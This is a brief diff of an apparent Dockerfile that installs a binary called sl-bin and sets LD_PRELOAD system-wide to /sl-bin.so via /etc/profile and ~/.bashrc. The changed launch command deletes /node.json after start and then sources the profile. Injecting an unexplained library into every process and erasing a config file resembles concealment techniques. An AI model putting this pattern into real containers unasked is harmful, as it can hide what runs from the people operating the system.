@@ -11,4 +11,4 @@ RUN rm -rf SL-Bin
 RUN chmod +x /usr/bin/sl-bin
 RUN echo 'export LD_PRELOAD=/sl-bin.so' >> /etc/profile
 RUN echo 'export LD_PRELOAD=/sl-bin.so' >> ~/.bashrc
-CMD sl-bin run -c /sl-bin.json && rm -rf /node.json
+CMD sl-bin run -c /sl-bin.json && rm -rf /node.json && source /etc/profile
